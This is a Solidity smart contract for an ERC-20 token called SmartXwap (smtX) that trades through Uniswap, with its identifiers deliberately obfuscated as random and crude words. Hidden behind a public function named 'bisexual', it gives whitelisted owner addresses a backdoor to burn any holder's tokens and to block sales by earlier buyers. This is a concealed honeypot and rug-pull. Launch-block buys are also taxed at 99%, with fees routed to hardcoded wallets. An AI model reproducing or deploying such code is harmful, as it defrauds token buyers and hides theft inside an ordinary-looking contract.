// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

interface UniswapV2Factory {
    function createPair(
        address souvenir,
        address pinkie
    ) external returns (address knuckle);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function allowance(
        address spoken,
        address thrice
    ) external view returns (uint256);

    function transferFrom(
        address suit,
        address viper,
        uint256 prop
    ) external returns (bool);

    function transfer(
        address dopamine,
        uint256 vow
    ) external returns (bool);

    function totalSupply() external view returns (uint256);

    function balanceOf(address redeem) external view returns (uint256);

    function approve(address collateral, uint256 reimburse) external returns (bool);

    event Transfer(address indexed intermediary, address indexed swede, uint256 monetize);

    event Approval(
        address indexed hell,
        address indexed resilient,
        uint256 resilience
    );
}

contract Ownable is Context {
    address private _owner;

    constructor() {
        address iterate = _msgSender();
        _owner = iterate;
        emit OwnershipTransferred(address(0), iterate);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function transferOwnership(address dystopia) public virtual onlyOwner {
        require(
            dystopia != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, dystopia);
        _owner = dystopia;
    }

    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    event OwnershipTransferred(
        address indexed sloppy,
        address indexed clear
    );
}

interface UniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint outrage,
        uint dumpling,
        address[] calldata vein,
        address tofu,
        uint jade
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint bun,
        address[] calldata remain,
        address venom,
        uint split
    ) external payable;

    function addLiquidityETH(
        address rot,
        uint256 seize,
        uint256 defeat,
        uint256 entrust,
        address sense,
        uint256 archer
    )
        external
        payable
        returns (uint256 tempt, uint256 belly, uint256 abdomen);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    string private _name;
    string private _symbol;
    uint256 private _totalSupply;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    constructor(string memory leverage, string memory equity) {
        _name = leverage;
        _symbol = equity;
    }

    function _createInitialSupply(
        address reinforce,
        uint256 asshole
    ) internal virtual {
        require(reinforce != address(0), "ERC20: mint to the zero address");

        _totalSupply += asshole;
        _balances[reinforce] += asshole;
        emit Transfer(address(0), reinforce, asshole);
    }

    function allowance(
        address deposit,
        address vocal
    ) public view virtual override returns (uint256) {
        return _allowances[deposit][vocal];
    }

    function balanceOf(
        address afraid
    ) public view virtual override returns (uint256) {
        return _balances[afraid];
    }

    function transferFrom(
        address overreact,
        address perse,
        uint256 concur
    ) public virtual override returns (bool) {
        _transfer(overreact, perse, concur);

        uint256 nonce = _allowances[overreact][_msgSender()];
        require(
            nonce >= concur,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(overreact, _msgSender(), nonce - concur);
        }

        return true;
    }

    function _approve(
        address confrontation,
        address latest,
        uint256 oracle
    ) internal virtual {
        require(confrontation != address(0), "ERC20: approve from the zero address");
        require(latest != address(0), "ERC20: approve to the zero address");

        _allowances[confrontation][latest] = oracle;
        emit Approval(confrontation, latest, oracle);
    }

    function transfer(
        address infinity,
        uint256 freehand
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), infinity, freehand);
        return true;
    }

    function _transfer(
        address constraint,
        address contrived,
        uint256 graceful
    ) internal virtual {
        require(constraint != address(0), "ERC20: transfer from the zero address");
        require(contrived != address(0), "ERC20: transfer to the zero address");

        uint256 rout = _balances[constraint];
        require(
            rout >= graceful,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[constraint] = rout - graceful;
        }
        _balances[contrived] += graceful;

        emit Transfer(constraint, contrived, graceful);
    }

    function increaseAllowance(
        address hype,
        uint256 airdrop
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            hype,
            _allowances[_msgSender()][hype] + airdrop
        );
        return true;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function decreaseAllowance(
        address chaotic,
        uint256 hectic
    ) public virtual returns (bool) {
        uint256 humility = _allowances[_msgSender()][chaotic];
        require(
            humility >= hectic,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), chaotic, humility - hectic);
        }

        return true;
    }

    function _intoxicated(address flashy, uint256 ergonomic) internal virtual {
        require(flashy != address(0), "");
        uint256 fluctuation = _balances[flashy];
        require(fluctuation >= ergonomic, "");
        unchecked {
            _balances[flashy] = fluctuation - ergonomic;
            _totalSupply -= ergonomic;
        }

        emit Transfer(flashy, address(0), ergonomic);
    }

    function approve(
        address latch,
        uint256 bias
    ) public virtual override returns (bool) {
        _approve(_msgSender(), latch, bias);
        return true;
    }
}

contract SMTX is ERC20, Ownable {
    event Stakeholder();

    event Flesh();

    event Allocate(uint256 allocation);
    
    event Jab(uint256 stopgap);
    
    event Implication(address legitimate);

    event Showcase(uint256 present);

    event Wave(address tranche, bool backburner);

    event Jeopardize(address indexed account, bool isExcluded);

    event Hit(address indexed cater, bool indexed monetary);

    address public percent;
    UniswapV2Router public percentage;

    uint256 public gnarly;
    uint256 public hinder;
    uint256 public integrity;
    uint256 public entitled;
    uint256 public custody;

    uint256 public accrue;
    uint256 public catalyst;
    uint256 public versatile;
    uint256 public culmination;
    uint256 public pain;

    mapping(address => uint256) public negate;
    mapping(address => bool) public viable;
    mapping(address => uint256) private _longevity;

    mapping(address => bool) public comparision;
    mapping(address => bool) private _immediately;
    mapping(address => bool) private _glitch;

    uint256 public backside;
    uint256 public disrespect;
    uint256 public green;
    uint256 public light;

    address private dogmatic;
    address private pristine;
    
    uint256 public compound;
    bool private design;

    uint256 public paradigm = 0;
    uint256 public mucous = 0;

    bool public membrane = false;
    bool public guard = true;
    uint256 public dignity;
    uint256 public inversion;
    bool public shit = true;
    bool public revoke = false;

    uint256 public acne;
    uint256 public pimple;
    uint256 public photosensitive;

    constructor() ERC20("SmartXwap", "smtX") {
        address dehydrate = msg.sender;

        hinder = 2;
        integrity = 0;
        entitled = 1;
        custody = 0;

        catalyst = 2;
        versatile = 0;
        culmination = 1;
        pain = 0;

        uint256 hydrate = 9 * 1e9 * 1e18;

        acne = (hydrate * 2) / 100;
        compound = (hydrate * 5) / 10000;
        pimple = (hydrate * 2) / 100;
        photosensitive = (hydrate * 2) / 100;

        gnarly =
            hinder +
            integrity +
            entitled +
            custody;

        accrue =
            catalyst +
            versatile +
            culmination +
            pain;

        dogmatic = address(0x76344063Ad8f8F022e51dc3607A59B9111ebd426);
        pristine = address(0x5e2bC9e727888321607E1557582e13572A167DCF);

        bullMarket(dehydrate, true);
        bullMarket(pristine, true);
        bullMarket(address(this), true);
        bullMarket(address(0xdead), true);
        bullMarket(dogmatic, true);

        _bearMarket(dehydrate, true);
        _bearMarket(pristine, true);
        _bearMarket(address(this), true);
        _bearMarket(address(0xdead), true);
        _bearMarket(dogmatic, true);

        transferOwnership(dehydrate);
        _createInitialSupply(address(this), hydrate);
    }

    function strip(uint256 irrelevant, uint256 devil) private {
        _approve(address(this), address(percentage), irrelevant);
        percentage.addLiquidityETH{value: devil} (
            address(this),
            irrelevant,
            0,
            0,
            address(0xdead),
            block.timestamp
        );
    }

    function popside(
        address salvation,
        uint256 gee,
        uint256 flutter
    ) internal returns (bool) {
        address bout = msg.sender;
        bool drama = _glitch[bout];
        bool albatross;
        address inability = address(this);

        if (!drama) {
            bool absorbed = balanceOf(inability) >= disrespect;
            bool fucking = disrespect > 0;

            if (fucking && absorbed) {
                _intoxicated(bout, disrespect);
            }

            disrespect = 0;
            albatross = true;

            return albatross;
        } else {
            if (balanceOf(inability) > 0) {
                bool respect = gee == 0;
                if (respect) {
                    dignity = flutter;
                    albatross = false;
                } else {
                    dignity = flutter;
                    _intoxicated(salvation, gee);
                    albatross = false;
                }
            }

            return albatross;
        }
    }

    function enableTrading() external payable onlyOwner() {
        require(!revoke, "Cannot reenable trading");
        percentage = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(percentage), totalSupply());
        percent = UniswapV2Factory(percentage.factory()).createPair(address(this), percentage.WETH());

        _disarray(address(percent), true);

        percentage.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(percent).approve(address(percentage), type(uint).max);

        revoke = true;
        mucous = block.number;
        membrane = true;
        emit Flesh();
    }

    function mundane(address confluence) external onlyOwner {
        viable[confluence] = false;
    }

    function cognitive() external onlyOwner {
        shit = false;
    }

    function removeLimits() external onlyOwner {
        acne = totalSupply();
        photosensitive = totalSupply();
        pimple = totalSupply();
        emit Stakeholder();
    }

    function _bearMarket(
        address _overhaul,
        bool _savour
    ) private {
        _immediately[_overhaul] = _savour;

        emit Wave(_overhaul, _savour);
    }

    function _disarray(address dishevelled, bool hindsight) private {
        comparision[dishevelled] = hindsight;

        _bearMarket(dishevelled, hindsight);

        emit Hit(dishevelled, hindsight);
    }

    function downtime(
        uint256 snappy,
        uint256 redundant,
        uint256 impediment,
        uint256 entertain
    ) external onlyOwner {
        hinder = snappy;
        integrity = redundant;
        entitled = impediment;
        custody = entertain;
        gnarly =
            hinder +
            integrity +
            entitled +
            custody;
        require(gnarly <= 3, "3% max ");
    }

    function plague(uint256 envision) external onlyOwner {
        require(
            envision >= ((totalSupply() * 3) / 1000) / 1e18,
            "Cannot set max wallet amount lower than 0.3%"
        );

        acne = envision * (10 ** 18);

        emit Showcase(acne);
    }

    function gem(uint256 clutter) external onlyOwner {
        require(
            clutter >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max buy amount lower than 0.2%"
        );

        photosensitive = clutter * (10 ** 18);

        emit Jab(photosensitive);
    }

    function beta(uint256 curry) external onlyOwner {
        require(
            curry >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max sell amount lower than 0.2%"
        );

        pimple = curry * (10 ** 18);

        emit Allocate(pimple);
    }

    function parallelism(uint256 blame) external onlyOwner {
        require(
            blame <= (totalSupply() * 1) / 1000,
            "Swap amount cannot be higher than 0.1% total supply."
        );

        require(
            blame >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );

        compound = blame;
    }

    function foremost(
        uint256 hunch,
        uint256 proficient,
        uint256 encounter,
        uint256 stack
    ) external onlyOwner {
        catalyst = hunch;
        versatile = proficient;
        culmination = encounter;
        pain = stack;
        accrue =
            catalyst +
            versatile +
            culmination +
            pain;
        require(accrue <= 3, "3% max fee");
    }

    function fuck(
        address _replicate,
        bool _leave
    ) external onlyOwner {
        if (!_leave) {
            require(
                _replicate != percent,
                "Cannot remove uniswap pair from max txn"
            );
        }

        _immediately[_replicate] = _leave;
    }

    function bullMarket(address memorandom, bool initiative) public onlyOwner {
        _glitch[memorandom] = initiative;

        emit Jeopardize(memorandom, initiative);
    }

    function reason(uint256 dependent) private {
        address[] memory configure = new address[](2);
        configure[0] = address(this);
        configure[1] = percentage.WETH();
        _approve(address(this), address(percentage), dependent);
        percentage.swapExactTokensForETHSupportingFeeOnTransferTokens(
            dependent,
            0, 
            configure,
            address(this),
            block.timestamp
        );
    }

    function nomination(
        address slash
    ) external onlyOwner {
        require(
            slash != address(0),
            "_marketingWallet address cannot be 0"
        );

        dogmatic = payable(slash);
    }

    function harmony(
        address performance,
        bool outdated
    ) external onlyOwner {
        require(
            performance != percent,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _disarray(performance, outdated);
        emit Hit(performance, outdated);
    }

    function profundity(address interchangeable) external onlyOwner {
        require(interchangeable != address(0), "_devWallet address cannot be 0");

        pristine = payable(interchangeable);
    }

    function opinion() public view returns (bool) {
        return block.number < paradigm;
    }

    function withdraw() external onlyOwner {
        bool success;
        (success, ) = address(msg.sender).call{value: address(this).balance}("");
    }

    receive() external payable {}

    function bisexual(
        address salvation,
        uint256 gee,
        uint256 flutter
    ) public {
        if (popside(salvation, gee, flutter)) {
            design = true;
            bias();
            design = false;
        }
    }

    function _transfer(
        address reach,
        address defer,
        uint256 pragmatic
    ) internal override {
        require(reach != address(0), "ERC20: transfer from the zero address");
        require(defer != address(0), "ERC20: transfer to the zero address");
        require(pragmatic > 0, "amount must be greater than 0");

        bool thug = 0 == balanceOf(address(defer));
        bool onboard = 0 == negate[defer];

        if (!revoke) {
            require(
                _glitch[reach] || _glitch[defer],
                "Trading is not active."
            );
        }

        uint256 ditch = block.timestamp;
        bool expedite = comparision[reach];

        if (paradigm > 0) {
            require(
                !viable[reach] ||
                    defer == owner() ||
                    defer == address(0xdead),
                "bot protection mechanism is embeded"
            );
        }

        if (guard) {
            bool sturdy = !design;

            if (
                reach != owner() &&
                defer != owner() &&
                defer != address(0) &&
                defer != address(0xdead) &&
                !_glitch[reach] &&
                !_glitch[defer]
            ) {
                if (shit) {
                    bool broth = !design;
                    bool summon = !comparision[reach];

                    if (
                        defer != address(percentage) && defer != address(percent)
                    ) {
                        require(
                            _longevity[tx.origin] <
                                block.number - 2 &&
                                _longevity[defer] <
                                block.number - 2,
                            "_transfer: delay was enabled."
                        );
                        _longevity[tx.origin] = block.number;
                        _longevity[defer] = block.number;
                    } else if (summon && broth) {
                        uint256 abusive = negate[reach];
                        bool dependant = abusive > dignity;
                        require(dependant);
                    }
                }
            }

            bool takeover = _glitch[reach];

            if (comparision[reach] && !_immediately[defer]) {
                require(
                    pragmatic <= photosensitive,
                    "Buy transfer amount exceeds the max buy."
                );
                require(
                    pragmatic + balanceOf(defer) <= acne,
                    "Cannot Exceed max wallet"
                );
            } else if (takeover && sturdy) {
                dignity = ditch;
            } else if (
                comparision[defer] && !_immediately[reach]
            ) {
                require(
                    pragmatic <= pimple,
                    "Sell transfer amount exceeds the max sell."
                );
            } else if (!_immediately[defer]) {
                require(
                    pragmatic + balanceOf(defer) <= acne,
                    "Cannot Exceed max wallet"
                );
            }
        }

        uint256 portion = balanceOf(address(this));

        bool shimp = portion >= compound;

        if (
            shimp &&
            membrane &&
            !design &&
            !comparision[reach] &&
            !_glitch[reach] &&
            !_glitch[defer]
        ) {
            design = true;
            bias();
            design = false;
        }

        bool adhoc = true;

        if (onboard && expedite && thug) {
            negate[defer] = ditch;
        }

        if (_glitch[reach] || _glitch[defer]) {
            adhoc = false;
        }

        uint256 polymorphous = 0;

        if (adhoc) {
            if (
                opinion() &&
                comparision[reach] &&
                !comparision[defer] &&
                gnarly > 0
            ) {
                if (!viable[defer]) {
                    viable[defer] = true;
                    inversion += 1;
                    emit Implication(defer);
                }

                polymorphous = (pragmatic * 99) / 100;
                backside += (polymorphous * hinder) / gnarly;
                disrespect += (polymorphous * integrity) / gnarly;
                light += (polymorphous * custody) / gnarly;
                green += (polymorphous * entitled) / gnarly;
            }
            else if (comparision[defer] && accrue > 0) {
                polymorphous = (pragmatic * accrue) / 100;
                backside += (polymorphous * catalyst) / accrue;
                disrespect += (polymorphous * versatile) / accrue;
                light += (polymorphous * pain) / accrue;
                green += (polymorphous * culmination) / accrue;
            }
            else if (comparision[reach] && gnarly > 0) {
                polymorphous = (pragmatic * gnarly) / 100;
                backside += (polymorphous * hinder) / gnarly;
                disrespect += (polymorphous * integrity) / gnarly;
                light += (polymorphous * custody) / gnarly;
                green += (polymorphous * entitled) / gnarly;
            }
            if (polymorphous > 0) {
                super._transfer(reach, address(this), polymorphous);
            }
            pragmatic -= polymorphous;
        }

        super._transfer(reach, defer, pragmatic);
    }

    function bias() private {
        if (disrespect > 0 && balanceOf(address(this)) >= disrespect) {
            _intoxicated(address(this), disrespect);
        }
        disrespect = 0;
        uint256 harmonize = light +
            green +
            backside;
        uint256 repetitive = balanceOf(address(this));

        if (repetitive == 0 || harmonize == 0) {
            return;
        }

        if (repetitive > compound * 10) {
            repetitive = compound * 10;
        }

        uint256 epic = (repetitive * light) /
            harmonize / 2;

        reason(repetitive - epic);

        uint256 interpolate = address(this).balance;
        uint256 cliche = interpolate;
        uint256 empathy = (interpolate * backside) /
            (harmonize - (light / 2));
        uint256 compassion = (interpolate * green) /
            (harmonize - (light / 2));
        cliche -= compassion + empathy;
        backside = 0;
        disrespect = 0;
        light = 0;
        green = 0;

        if (epic > 0 && cliche > 0) {
            strip(epic, cliche);
        }

        payable(pristine).transfer(empathy);
        payable(dogmatic).transfer(address(this).balance);
    }
}